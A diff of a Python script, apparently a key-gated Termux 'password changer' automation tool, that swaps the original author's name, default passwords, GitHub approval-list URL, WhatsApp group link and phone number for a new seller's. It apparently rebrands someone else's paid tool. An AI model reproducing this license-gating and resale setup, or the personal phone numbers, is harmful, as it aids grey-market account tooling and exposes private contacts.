@@ -937,9 +932,9 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "Anaya"
+			iamdefaultpassword = "UMAR"
 		logo()
-		p(" [•] Password Changer By : Anaya ")
+		p(" [•] Password Changer By : UMAR ")
 		line()
 		print(" [•] Default Password : %s "%(iamdefaultpassword))
 		line()
@@ -1000,7 +995,7 @@ class automation:
 		try:
 			iamdefaultpassword= open(".default_password.txt","r").read()
 		except FileNotFoundError:
-			iamdefaultpassword = "Anaya786"
+			iamdefaultpassword = "UMAR786"
 		p(" [•] Default Password : %s"%(iamdefaultpassword))
 		line()
 		os.system("rm -rf .default_password.txt ")
@@ -1023,12 +1018,12 @@ def shoha_menu():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/Anaya0309/Anaya/blob/main/Paid.txt").text
+    DARK=requests.get("https://github.com/GitHub6G/Git-Hub/blob/main/Approval.txt").text
     if id in DARK:
         'main()'
     else:
         os.system("clear")
-        os.system("xdg-open https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7")
+        os.system("xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf")
         time.sleep(3.0)
         
         os.system("clear")
@@ -1053,7 +1048,7 @@ def shoha_menu():
         name = input(" Your Name : ")
         print ("")
         input(" Press Enter To Send Key")
-        os.system("xdg-open https://wa.me/+923096902140")
+        os.system("xdg-open https://wa.me/+923021431324")
         shoha_menu()
 
 shoha_menu()
